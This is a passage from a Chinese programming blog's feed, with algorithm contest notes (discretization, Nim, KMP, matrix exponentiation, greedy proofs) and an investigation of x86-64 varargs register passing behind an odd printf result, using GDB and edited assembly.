class="comment">//l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要</span></span><br><span class="line">          <span class="comment">//给 m+1 位置减去num,</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,S(x));</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=x;i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;c[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=x;i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;S(i)&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="离散化"><a href="#离散化" class="headerlink" title="离散化"></a>离散化</h3><ul><li><p><a href="https://vijos.org/p/1056" target="_blank" rel="noopener">图形面积</a>，<a href="http://www.cnblogs.com/forgot93/archive/2014/07/02/3819956.html" target="_blank" rel="noopener">解答</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">double</span> x[<span class="number">201</span>],y[<span class="number">201</span>],s[<span class="number">101</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> xy[<span class="number">201</span>][<span class="number">201</span>];</span><br><span class="line"><span class="keyword">int</span> n,cas=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> sum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)   <span class="keyword">break</span>;</span><br><span class="line">        cas++;</span><br><span class="line">        k=<span class="number">0</span>;</span><br><span class="line">        sum=<span class="number">0.0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(xy,<span class="number">0</span>,<span class="keyword">sizeof</span>(xy));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;s[i][<span class="number">0</span>]&gt;&gt;s[i][<span class="number">1</span>]&gt;&gt;s[i][<span class="number">2</span>]&gt;&gt;s[i][<span class="number">3</span>];</span><br><span class="line">            x[k]=s[i][<span class="number">0</span>];</span><br><span class="line">            y[k]=s[i][<span class="number">1</span>];</span><br><span class="line">            k++;</span><br><span class="line">            x[k]=s[i][<span class="number">2</span>];</span><br><span class="line">            y[k]=s[i][<span class="number">3</span>];</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+<span class="number">2</span>*n);</span><br><span class="line">        sort(y,y+<span class="number">2</span>*n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="keyword">int</span>  i1=lower_bound(x,x+<span class="number">2</span>*n,s[i][<span class="number">0</span>])-x;<span class="comment">//二分查找，跟普通的FOR语句一样</span></span><br><span class="line">         <span class="keyword">int</span>  j1=lower_bound(y,y+<span class="number">2</span>*n,s[i][<span class="number">1</span>])-y;</span><br><span class="line">         <span class="keyword">int</span>  i2=lower_bound(x,x+<span class="number">2</span>*n,s[i][<span class="number">2</span>])-x;</span><br><span class="line">         <span class="keyword">int</span>  j2=lower_bound(y,y+<span class="number">2</span>*n,s[i][<span class="number">3</span>])-y;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> p1=i1;p1&lt;i2;p1++)</span><br><span class="line">           <span class="comment">//标记状态，记住我们是以一个方块的角标记状态所以p1&lt;i2，不是&lt;=</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> p=j1;p&lt;j2;p++)</span><br><span class="line">         xy[p1][p]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>*n;i++)<span class="comment">//统计</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>*n;j++)</span><br><span class="line">            <span class="keyword">if</span> (xy[i][j]) &#123;</span><br><span class="line">            sum+=(x[i+<span class="number">1</span>]-x[i])*(y[j+<span class="number">1</span>]-y[j]);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Test case #%d\n"</span>,cas);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Total explored area: %.2f\n"</span>,sum);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。</p></li></ul><h3 id="POJ3278"><a href="#POJ3278" class="headerlink" title="POJ3278"></a>POJ3278</h3><ul><li>N是人的位置，K是牛的位置</li><li>一种lgN的做法<ul><li>如果N的二进制大于等于K的二进制，则直接走x-1法</li><li>否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1）</li><li>假设K与N重合的二进制部分为W<ul><li>如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W）</li><li>如果W&gt;N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合</li><li>即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W）</li></ul></li><li>总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2…P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间</li><li>也就是不断试错的过程</li></ul></li></ul><h3 id="子集和问题的动态规划解法"><a href="#子集和问题的动态规划解法" class="headerlink" title="子集和问题的动态规划解法"></a>子集和问题的动态规划解法</h3><ul><li>如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行</li></ul><h3 id="子集和问题变形"><a href="#子集和问题变形" class="headerlink" title="子集和问题变形"></a>子集和问题变形</h3><ul><li>问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划</li></ul><h3 id="floyd求最小环"><a href="#floyd求最小环" class="headerlink" title="floyd求最小环"></a>floyd求最小环</h3><ul><li>最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边）</li><li>如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。</li><li>否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到</li></ul><h3 id="查询第K大"><a href="#查询第K大" class="headerlink" title="查询第K大"></a>查询第K大</h3><ul><li>如果是静态数组，多次查询，直接一个sort</li><li>如果是静态数组，一次查询，算导中那个快排变体，$O(N)$</li><li>如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快</li></ul><h3 id="Nim游戏（博弈论）"><a href="#Nim游戏（博弈论）" class="headerlink" title="Nim游戏（博弈论）"></a>Nim游戏（博弈论）</h3><ul><li><blockquote><p>定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。</p></blockquote></li><li>P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。</li><li>通过数学归纳法，两堆石子的情况下，两堆相等是P-position</li><li><blockquote><p>如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。</p></blockquote></li><li></li></ul><h3 id="HDU3483"><a href="#HDU3483" class="headerlink" title="HDU3483"></a>HDU3483</h3><h5 id="题意"><a href="#题意" class="headerlink" title="[题意]"></a>[题意]</h5><p>输入n, x, m ，求$(1^x)<em>(x^1)+(2^x)</em>(x^2)+(3^x)<em>(x^3)+…+(n^x)</em>(x^n)$ </p><h5 id="解题方法"><a href="#解题方法" class="headerlink" title="[解题方法]"></a>[解题方法]</h5><p>设$f[n] = [x^n, n<em>(x^n), (n^2)</em>(x^n),…, (n^x)<em>(x^n)]$，则$f[n][k] = (n^k)</em>(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+…+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)<em>(x^(n+1)) \text{（二次多项式展开）}\ = x</em>( C(k,0)<em>(x^n)+C(k,1)</em>n<em>(x^n)+…+C(k,k)</em>(n^k)<em>(x^n))\= x</em>(C(k,0)<em>f[n][0]+C(k,1)</em>f[n][1]+…+C(k,k)*f[n][k])​$$<br>所以得： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|x*1 0................................0|        |f[n][0]|       |f[n+1][0]| </span><br><span class="line">|x*1 x*1 0............................0|        |f[n][1]|       |f[n+1][1]| </span><br><span class="line">|x*1 x*2 x*1 0........................0|    *   |f[n][2]|   =   |f[n+1][2]| </span><br><span class="line">|......................................|        |.......|       |.........| </span><br><span class="line">|x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0|        |f[n][k]|       |f[n+1][k]| </span><br><span class="line">|......................................|        |.......|       |.........| </span><br><span class="line">|x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0|        |f[n][x]|       |f[n+1][x]| </span><br><span class="line">|0................................0 1 1|        |g[n-1] |       | g[ n ]  |</span><br></pre></td></tr></table></figure><h3 id="KMP算法理解"><a href="#KMP算法理解" class="headerlink" title="KMP算法理解"></a>KMP算法理解</h3><h4 id="预处理算法"><a href="#预处理算法" class="headerlink" title="预处理算法"></a>预处理算法</h4><ul><li>预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。</li></ul><h3 id="为什么偶数长度的回文数字串不是primer"><a href="#为什么偶数长度的回文数字串不是primer" class="headerlink" title="为什么偶数长度的回文数字串不是primer"></a>为什么偶数长度的回文数字串不是primer</h3><ul><li><a href="https://leetcode.com/problems/prime-palindrome/discuss/212297/Why-even-prime-palindromes-are-not-possible" target="_blank" rel="noopener">ref</a></li><li><blockquote><p>Because even length prime digit numbers are divisible by 11 therefore are not prime.<br>It’s a trick that has to do powers of 10 and mod 11.<br>Ex: 10 = 10^1 mod 11 = -1 mod 11<br>​      $100 = 10^2 = 1 \mod 11$<br>​      $1000 = 10^3 = -1 \mod 11$<br>​      $10000 = 10^4 = 1 \mod 11$<br>See the pattern?<br>Even exponent powers of 10 are 1 mod 11<br>Odd exponent powers of 10 are -1 mod 11.</p><p>We also know decimal numbers are just base 10 expansion of the digits.</p><p>So   $1225 = (10^3<em>)1 + 2</em>(10^2) + 2<em>(10^1) + 5</em>(10^0).$<br>​        using modular arithmetic we can say,</p><pre><code>1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8.In other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits.</code></pre><p>Another example.</p><p>$1323412 \mod 11 =   1 -3  +2 -3 +4 -1 +2\mod 11 = 0.$</p><p>Then it becomes why it is quite obvious why the above logic works for even palindromes.</p><p>Example: </p><p>$321123 =      -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other.</p></blockquote></li></ul><h3 id="贪心算法总结"><a href="#贪心算法总结" class="headerlink" title="贪心算法总结"></a>贪心算法总结</h3><ul><li>在每个贪心算法后面几乎总有一个DP解法</li><li>如何<strong>证明</strong>是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素</li><li>如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法</li></ul><h5 id="贪心选择性质"><a href="#贪心选择性质" class="headerlink" title="贪心选择性质"></a>贪心选择性质</h5><ul><li>可以通过做出局部最优的选择来构造全局最优</li><li>证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题</li></ul><h5 id="一组有效的步骤"><a href="#一组有效的步骤" class="headerlink" title="一组有效的步骤"></a>一组有效的步骤</h5><ul><li>确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质）</li><li>设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP）</li><li>证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少）</li><li>证明贪心选择总是安全的<ul><li>什么是安全的？</li><li>做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li><li>做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li></ul></li><li>设计一个递归算法实现贪心策略</li><li>把递归算法转为迭代算法</li></ul><h5 id="一组简化的步骤"><a href="#一组简化的步骤" class="headerlink" title="一组简化的步骤"></a>一组简化的步骤</h5><ul><li>将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解</li><li>证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li><li>证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;全源最短路径的一种错误解法&quot;&gt;&lt;a href=&quot;#全源最短路径的一种错误解法&quot; class=&quot;headerlink&quot; title=&quot;全源最短路径的一种错误解法&quot;&gt;&lt;/a&gt;全源最短路径的一种错误解法&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;错误代码&lt;/p&gt;
&lt;figure 
      
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="note" scheme="https://h-zex.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>printf的一个异常现象引发的对x86-64体系下可变参数传参的探究</title>
    <link href="https://h-zex.github.io/2018/01/19/printf%E7%9A%84%E4%B8%80%E4%B8%AA%E5%BC%82%E5%B8%B8%E7%8E%B0%E8%B1%A1%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9x86-64%E4%BD%93%E7%B3%BB%E4%B8%8B%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E4%BC%A0%E5%8F%82%E7%9A%84%E6%8E%A2%E7%A9%B6/"/>
    <id>https://h-zex.github.io/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/</id>
    <published>2018-01-19T03:31:36.000Z</published>
    <updated>2019-07-02T15:43:51.385Z</updated>
    
    <content type="html"><![CDATA[<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clang version 3.8.1-24 (tags/RELEASE_381/final)</span><br><span class="line">Target: x86_64-pc-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line"></span><br><span class="line">Linux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)</span><br></pre></td></tr></table></figure><h3 id="奇异现象复现"><a href="#奇异现象复现" class="headerlink" title="奇异现象复现"></a>奇异现象复现</h3><ul><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">6.0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lx\n"</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行结果</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p6.png"></li><li><p>这段代码用的运行结果是随机的，无规律的，这是非常奇怪的</p></li></ul><h3 id="先说原因"><a href="#先说原因" class="headerlink" title="先说原因"></a>先说原因</h3><ul><li>printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li><p>先看glibc-2.26中<code>stdio-common/printf.c</code>的源码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__printf (<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="keyword">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = <span class="built_in">vfprintf</span> (<span class="built_in">stdout</span>, format, arg);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看到，使用的是stdarg的机制实现可变参数传参。</p></li><li><p>如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参</p></li><li><p>复习一下CSAPP第三章</p> <img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p1.png"> <img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p2.png"></li><li><p>可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器</p></li><li>那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li></ul><h3 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h3><ul><li><p>使用 <code>clang -S d.c &amp;&amp;  clang d.s -g</code>命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点</p></li><li><p>main函数部分汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">subq$16, %rsp</span><br><span class="line">movabsq$.L.str, %rdi# .L.str就是&quot;%lx\n&quot;</span><br><span class="line">movsd.LCPI0_0, %xmm0    </span><br><span class="line"># 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0</span><br><span class="line">movsd%xmm0, -8(%rbp)</span><br><span class="line">movsd-8(%rbp), %xmm0        </span><br><span class="line">movb$1, %al</span><br><span class="line">callqprintf</span><br></pre></td></tr></table></figure></li><li><p>可以看到，double a 确实放在了xmm0,</p></li><li><p>用GDB在 <code>callq printf</code> 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p4.png"><p>（红框内是前四个传参的通用目的寄存器）</p></li><li><p>执行gdb 的<code>next</code>指令 ，运行<code>callq printf</code>这条指令，检查输出</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p3.png"></li><li><p>可以看到，与<code>rsi</code>寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数</p></li><li><p>手动修改汇编代码，在callq printf之前加上一条<code>movq $16, %rsi</code>（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movabsq$.L.str, %rdi</span><br><span class="line">movsd.LCPI0_0, %xmm0         # xmm0 = mem[0],zero</span><br><span class="line">movsd%xmm0, -8(%rbp)</span><br><span class="line">movsd-8(%rbp), %xmm0         # xmm0 = mem[0],zero</span><br><span class="line">movb$1, %al</span><br><span class="line">movq    $16, %rsi # 这一条就是加上去的</span><br><span class="line">callqprintf</span><br></pre></td></tr></table></figure></li><li><p>运行，结果是</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p5.png"></li><li><p>符合预期，与rsi寄存器的东西一样</p></li><li><p>分析结果得到证实</p></li></ul><h3 id="探究过程出现的一些问题"><a href="#探究过程出现的一些问题" class="headerlink" title="探究过程出现的一些问题"></a>探究过程出现的一些问题</h3><ul><li>在不合时宜的时刻检查寄存器的值<ul><li>执行完<code>callq printf</code>后才检查xmm0、xmm1的内容，企图找到double a</li><li>执行完<code>callq printf</code>后才检查rdi、rsi的值。</li></ul></li><li>因为printf函数会使用这些寄存器，所以这样检查必然是不行的</li></ul><h3 id="关于vc-的一些补充"><a href="#关于vc-的一些补充" class="headerlink" title="关于vc++的一些补充"></a>关于vc++的一些补充</h3><ul><li><p><a href="https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx" target="_blank" rel="noopener">Visual Studio 2015的参数传递文档</a></p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p8.png"><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p7.png"><p>​    <strong>注意：这里的b不是在xmm0，而是在xmm1，d也是如此</strong></p></li></ul><ul><li><p><a href="https://msdn.microsoft.com//library/dd2wa36c.aspx" target="_blank" rel="noopener">Visual Studio 2015 的 Varargs文档 </a></p><blockquote><p> 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。<strong>仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值</strong></p><p> if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. <strong>For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.</strong></p></blockquote></li><li><p>按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，<strong>比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。</strong>这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。</p></li><li><p>这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）</p></li></ul>]]></content>
    
    <summary type="html">
    
      x86-64体系下的传参方式使得可变参数的传递出现了一些特别的情况
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="printf" scheme="https://h-zex.github.io/tags/printf/"/>
    
      <category term="操作系统" scheme="https://h-zex.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="底层" scheme="https://h-zex.github.io/tags/%E5%BA%95%E5%B1%82/"/>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>从时间戳（毫秒）计算日历</title>
    <link href="https://h-zex.github.io/2017/10/02/%E4%BB%8E%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%88%E6%AF%AB%E7%A7%92%EF%BC%89%E8%AE%A1%E7%AE%97%E6%97%A5%E5%8E%86/"/>
    <id>https://h-zex.github.io/2017/10/02/从时间戳（毫秒）计算日历/</id>
    <published>2017-10-02T08:58:15.000Z</published>
    <updated>2019-07-02T15:43:51.817Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 